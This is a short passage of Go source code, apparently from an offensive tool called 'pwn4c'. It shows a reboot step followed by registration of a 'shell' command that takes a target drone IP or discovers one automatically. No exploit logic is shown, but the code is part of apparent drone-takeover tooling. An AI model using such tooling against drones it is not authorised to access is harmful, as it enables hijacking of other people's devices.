	if err := s.client.Reboot(); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Println("[+] Rebooting. Re-run 'pwn4c shell' once the drone is back (~60s).")
}

func init() {
	shellCmd.Flags().StringVarP(&shellTarget, "target", "t", "", "Target drone IP (defaults to auto-discovery)")
	rootCmd.AddCommand(shellCmd)
}
